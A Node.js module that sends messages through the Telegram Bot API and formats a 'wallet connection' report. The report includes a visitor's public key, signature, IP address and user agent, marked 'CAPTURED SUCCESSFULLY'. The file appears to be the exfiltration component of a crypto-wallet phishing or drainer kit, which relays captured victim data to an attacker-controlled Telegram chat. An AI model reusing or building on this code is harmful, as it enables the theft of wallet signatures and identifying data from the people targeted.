const https = require('https');
const logger = require('./logger');

class TelegramBot {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
    }

    async sendMessage(message) {
        if (!this.token || this.token === 'YOUR_BOT_TOKEN') {
            console.log('[TELEGRAM REPORT - TOKEN NOT CONFIGURED]', message);
            return;
        }

        try {
            const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
            const payload = JSON.stringify({
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            });

            const options = {
                hostname: 'api.telegram.org',
                port: 443,
                path: `/bot${this.token}/sendMessage`,
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(payload)
                }
            };

            console.log(`[TELEGRAM] Sending to: ${this.chatId}`);
            console.log(`[TELEGRAM] Message: ${message}`);

            return new Promise((resolve, reject) => {
                const req = https.request(options, (res) => {
                    let data = '';
                    res.on('data', (chunk) => data += chunk);
                    res.on('end', () => {
                        console.log(`[TELEGRAM] Response status: ${res.statusCode}`);
                        console.log(`[TELEGRAM] Response data: ${data}`);
                        
                        if (res.statusCode === 200) {
                            console.log('[TELEGRAM] Message sent successfully!');
                            resolve(JSON.parse(data));
                        } else {
                            console.error(`[TELEGRAM] Failed: ${res.statusCode} - ${data}`);
                            reject(new Error(`HTTP ${res.statusCode}: ${data}`));
                        }
                    });
                });

                req.on('error', (error) => {
                    console.error('[TELEGRAM] Request error:', error);
                    reject(error);
                });

                req.write(payload);
                req.end();
            });
        } catch (error) {
            console.error('[TELEGRAM] Send error:', error);
            throw error;
        }
    }

    formatWalletReport(walletData) {
        const { publicKey, signature, timestamp, userAgent, ip } = walletData;
        
        return `🚨 WALLET CONNECTION DETECTED 🚨

📍 Public Key: ${publicKey}
✍️ Signature: ${signature}
🕐 Timestamp: ${new Date(timestamp).toLocaleString()}
🌐 IP Address: ${ip}
🖥️ User Agent: ${userAgent}

⚡ Status: CAPTURED SUCCESSFULLY`;
    }
}

module.exports = TelegramBot;